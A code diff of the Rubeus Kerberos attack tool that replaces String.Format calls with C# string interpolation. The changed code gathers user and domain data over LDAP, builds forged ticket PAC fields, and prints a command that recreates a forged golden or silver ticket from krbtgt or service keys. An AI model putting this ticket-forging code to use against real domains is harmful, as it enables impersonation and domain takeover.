@@ -196,12 +196,12 @@ namespace Rubeus
                 }
 
                 Console.WriteLine("[*] Trying to query LDAP using LDAPS for user information on domain controller {0}", domainController);
-                ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
+                ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, $"(samaccountname={user})", ssl);
                 if (ActiveDirectoryObjects == null)
                 {
                     Console.WriteLine("[!] LDAPS failed, retrying with plaintext LDAP.");
                     ssl = false;
-                    ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
+                    ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, $"(samaccountname={user})", ssl);
                 }
                 if (ActiveDirectoryObjects == null)
                 {
@@ -323,25 +323,25 @@ namespace Rubeus
                         {
                             foreach (string groupDN in (string[])userObject["memberof"])
                             {
-                                filter += String.Format("(distinguishedname={0})", groupDN);
+                                filter += $"(distinguishedname={groupDN})";
                             }
                             outputText += "group";
                         }
                     }
 
                     if (pGid == null)
-                        filter += String.Format("(objectsid={0}-{1})", domainSid, (string)userObject["primarygroupid"]);
+                        filter += $"(objectsid={domainSid}-{(string)userObject["primarygroupid"]})";
 
                     if (minPassAge == null || (maxPassAge == null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0)))
                     {
-                        filter = String.Format("{0}(name={{31B2F340-016D-11D2-945F-00C04FB984F9}})", filter);
+                        filter = $"{filter}(name={{31B2F340-016D-11D2-945F-00C04FB984F9}})";
                         if (String.IsNullOrEmpty(outputText))
                         {
                             outputText = "domain policy";
                         }
                         else
                         {
-                            outputText = String.Format("{0} and domain policy", outputText);
+                            outputText = $"{outputText} and domain policy";
                         }
                     }
 
@@ -349,7 +349,7 @@ namespace Rubeus
                     {
                         // Try to get group and domain policy information from LDAP
                         Console.WriteLine("[*] Retrieving {0} information over LDAP from domain controller {1}", outputText, domainController);
-                        adObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(|{0})", filter), ssl);
+                        adObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, $"(|{filter})", ssl);
                         if (adObjects == null)
                         {
                             Console.WriteLine("[!] Unable to get {0} information using LDAP, using defaults.", outputText);
@@ -371,8 +371,8 @@ namespace Rubeus
                             {
                                 if (o.ContainsKey("gpcfilesyspath"))
                                 {
-                                    string gptTmplPath = String.Format("{0}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf", (string)o["gpcfilesyspath"]);
-                                    gptTmplPath = gptTmplPath.Replace(String.Format("\\\\{0}\\", domain), String.Format("\\\\{0}\\", domainController));
+                                    string gptTmplPath = $"{(string)o["gpcfilesyspath"]}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf";
+                                    gptTmplPath = gptTmplPath.Replace($"\\\\{domain}\\", $"\\\\{domainController}\\");
                                     Dictionary<string, Dictionary<string, Object>> gptTmplObject = Networking.GetGptTmplContent(gptTmplPath, ldapuser, ldappassword);
 
                                     if (gptTmplObject == null)
@@ -436,9 +436,9 @@ namespace Rubeus
                         if (!domain.Equals(forestRoot))
                             configRootDomain = forestRoot;
 
-                        string configOU = String.Format("CN=Configuration,DC={0}", configRootDomain.Replace(".", ",DC="));
+                        string configOU = $"CN=Configuration,DC={configRootDomain.Replace(".", ",DC=")}";
 
-                        adObjects = Networking.GetLdapQuery(ldapCred, configOU, domainController, domain, String.Format("(&(netbiosname=*)(dnsroot={0}))", domain), ssl);
+                        adObjects = Networking.GetLdapQuery(ldapCred, configOU, domainController, domain, $"(&(netbiosname=*)(dnsroot={domain}))", ssl);
                         if (adObjects == null)
                         {
                             Console.WriteLine("[!] Unable to get netbios name information using LDAP, using defaults.");
@@ -770,7 +770,7 @@ namespace Rubeus
                 else
                     cn = new ClientName((DateTime)startTime, user);
 
-                UpnDns upnDns = new UpnDns(0, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
+                UpnDns upnDns = new UpnDns(0, domain.ToUpper(), $"{user}@{domain.ToLower()}");
 
                 S4UDelegationInfo s4u = null;
                 if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
@@ -842,7 +842,7 @@ namespace Rubeus
                 if (newPac)
                 {
                     attrib = new Attributes();
-                    requestor = new Requestor(String.Format("{0}-{1}", li.KerbValidationInfo.LogonDomainId?.GetValue(), li.KerbValidationInfo.UserId));
+                    requestor = new Requestor($"{li.KerbValidationInfo.LogonDomainId?.GetValue()}-{li.KerbValidationInfo.UserId}");
                 }
 
                 // clear signatures
@@ -1030,7 +1030,7 @@ namespace Rubeus
             if (printcmd)
             {
                 // print command to be able to recreate a ticket with this information
-                string cmdOut = String.Format("{0}", System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
+                string cmdOut = $"{System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName}";
 
                 // deal with differences between golden and silver
                 if (parts[0].Equals("krbtgt") && parts[1].Equals(domain))
@@ -1052,7 +1052,7 @@ namespace Rubeus
                     {
                         krbEncType = "aes256";
                     }
-                    cmdOut = String.Format("{0} silver /service:{1} /krbkey:{2} /kebenctype:{3}", cmdOut, sname, Helpers.ByteArrayToString(krbKey), krbEncType);
+                    cmdOut = $"{cmdOut} silver /service:{sname} /krbkey:{Helpers.ByteArrayToString(krbKey)} /kebenctype:{krbEncType}";
                 }
 
                 // add the service key
@@ -1069,91 +1069,91 @@ namespace Rubeus
                 {
                     svrEncType = "aes256";
                 }
-                cmdOut = String.Format("{0} /{1}:{2}", cmdOut, svrEncType, Helpers.ByteArrayToString(serviceKey));
+                cmdOut = $"{cmdOut} /{svrEncType}:{Helpers.ByteArrayToString(serviceKey)}";
 
                 // add the rest of the values
-                cmdOut = String.Format("{0} /user:{1} /id:{2} /pgid:{3} /domain:{4} /sid:{5}", cmdOut, user, kvi.UserId, kvi.PrimaryGroupId, domain, kvi.LogonDomainId.GetValue());
+                cmdOut = $"{cmdOut} /user:{user} /id:{kvi.UserId} /pgid:{kvi.PrimaryGroupId} /domain:{domain} /sid:{kvi.LogonDomainId.GetValue()}";
                 try
                 {
-                    cmdOut = String.Format("{0} /logofftime:\"{1}\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.LogoffTime.LowDateTime | ((long)kvi.LogoffTime.HighDateTime << 32)).ToLocalTime());
+                    cmdOut = $"{cmdOut} /logofftime:\"{DateTime.FromFileTimeUtc((long)kvi.LogoffTime.LowDateTime | ((long)kvi.LogoffTime.HighDateTime << 32)).ToLocalTime()}\"";
                 }
                 catch { }
                 try
                 {
-                    cmdOut = String.Format("{0} /pwdlastset:\"{1}\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32)).ToLocalTime());
+                    cmdOut = $"{cmdOut} /pwdlastset:\"{DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32)).ToLocalTime()}\"";
                 }
                 catch { }
                 if (minPassAge != null && minPassAge > 0)
                 {
-                    cmdOut = String.Format("{0} /minpassage:{1}", cmdOut, minPassAge);
+                    cmdOut = $"{cmdOut} /minpassage:{minPassAge}";
                 }
                 if (maxPassAge != null && maxPassAge > 0)
                 {
-                    cmdOut = String.Format("{0} /maxpassage:{1}", cmdOut, maxPassAge);
+                    cmdOut = $"{cmdOut} /maxpassage:{maxPassAge}";
                 }
                 if (kvi.BadPasswordCount > 0)
                 {
-                    cmdOut = String.Format("{0} /badpwdcount:{1}", cmdOut, kvi.BadPasswordCount);
+                    cmdOut = $"{cmdOut} /badpwdcount:{kvi.BadPasswordCount}";
                 }
                 if (kvi.LogonCount > 0)
                 {
-                    cmdOut = String.Format("{0} /logoncount:{1}", cmdOut, kvi.LogonCount);
+                    cmdOut = $"{cmdOut} /logoncount:{kvi.LogonCount}";
                 }
                 if (!String.IsNullOrEmpty(kvi.FullName.ToString()))
                 {
-                    cmdOut = String.Format("{0} /displayname:\"{1}\"", cmdOut, kvi.FullName.ToString());
+                    cmdOut = $"{cmdOut} /displayname:\"{kvi.FullName.ToString()}\"";
                 }
                 if (!String.IsNullOrEmpty(kvi.LogonScript.ToString()))
                 {
-                    cmdOut = String.Format("{0} /scriptpath:\"{1}\"", cmdOut, kvi.LogonScript.ToString());
+                    cmdOut = $"{cmdOut} /scriptpath:\"{kvi.LogonScript.ToString()}\"";
                 }
                 if (!String.IsNullOrEmpty(kvi.ProfilePath.ToString()))
                 {
-                    cmdOut = String.Format("{0} /profilepath:\"{1}\"", cmdOut, kvi.ProfilePath.ToString());
+                    cmdOut = $"{cmdOut} /profilepath:\"{kvi.ProfilePath.ToString()}\"";
                 }
                 if (!String.IsNullOrEmpty(kvi.HomeDirectory.ToString()))
                 {
-                    cmdOut = String.Format("{0} /homedir:\"{1}\"", cmdOut, kvi.HomeDirectory.ToString());
+                    cmdOut = $"{cmdOut} /homedir:\"{kvi.HomeDirectory.ToString()}\"";
                 }
                 if (!String.IsNullOrEmpty(kvi.HomeDirectoryDrive.ToString()))
                 {
-                    cmdOut = String.Format("{0} /homedrive:\"{1}\"", cmdOut, kvi.HomeDirectoryDrive.ToString());
+                    cmdOut = $"{cmdOut} /homedrive:\"{kvi.HomeDirectoryDrive.ToString()}\"";
                 }
                 if (!String.IsNullOrEmpty(kvi.LogonDomainName.ToString()))
                 {
-                    cmdOut = String.Format("{0} /netbios:{1}", cmdOut, kvi.LogonDomainName.ToString());
+                    cmdOut = $"{cmdOut} /netbios:{kvi.LogonDomainName.ToString()}";
                 }
                 if (kvi.GroupCount > 0)
                 {
-                    cmdOut = String.Format("{0} /groups:{1}", cmdOut, kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+                    cmdOut = $"{cmdOut} /groups:{kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next)}";
                 }
                 if (kvi.SidCount > 0)
                 {
-                    cmdOut = String.Format("{0} /sids:{1}", cmdOut, kvi.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
+                    cmdOut = $"{cmdOut} /sids:{kvi.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next)}";
                 }
                 if (kvi.ResourceGroupCount > 0)
                 {
-                    cmdOut = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", cmdOut, kvi.ResourceGroupDomainSid.GetValue().ToString(), kvi.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+                    cmdOut = $"{cmdOut} /resourcegroupsid:{kvi.ResourceGroupDomainSid.GetValue().ToString()} /resourcegroups:{kvi.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next)}";
                 }
                 if (!String.IsNullOrEmpty(kvi.LogonServer.ToString()))
                 {
-                    cmdOut = String.Format("{0} /dc:{1}.{2}", cmdOut, kvi.LogonServer.ToString(), domain);
+                    cmdOut = $"{cmdOut} /dc:{kvi.LogonServer.ToString()}.{domain}";
                 }
                 if ((Interop.PacUserAccountControl)kvi.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)
                 {
-                    cmdOut = String.Format("{0} /uac:{1}", cmdOut, String.Format("{0}", (Interop.PacUserAccountControl)kvi.UserAccountControl).Replace(" ", ""));
+                    cmdOut = $"{cmdOut} /uac:{$"{(Interop.PacUserAccountControl)kvi.UserAccountControl}".Replace(" ", "")}";
                 }
                 if (!user.Equals(cName))
                 {
-                    cmdOut = String.Format("{0} /cname:{1}", cmdOut, cName);
+                    cmdOut = $"{cmdOut} /cname:{cName}";
                 }
                 if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
                 {
-                    cmdOut = String.Format("{0} /s4uproxytarget:{1} /s4utransitiedservices:{2}", cmdOut, s4uProxyTarget, s4uTransitedServices);
+                    cmdOut = $"{cmdOut} /s4uproxytarget:{s4uProxyTarget} /s4utransitiedservices:{s4uTransitedServices}";
                 }
                 if (includeAuthData)
                 {
-                    cmdOut = String.Format("{0} /authdata", cmdOut);
+                    cmdOut = $"{cmdOut} /authdata";
                 }
 
                 // print the command
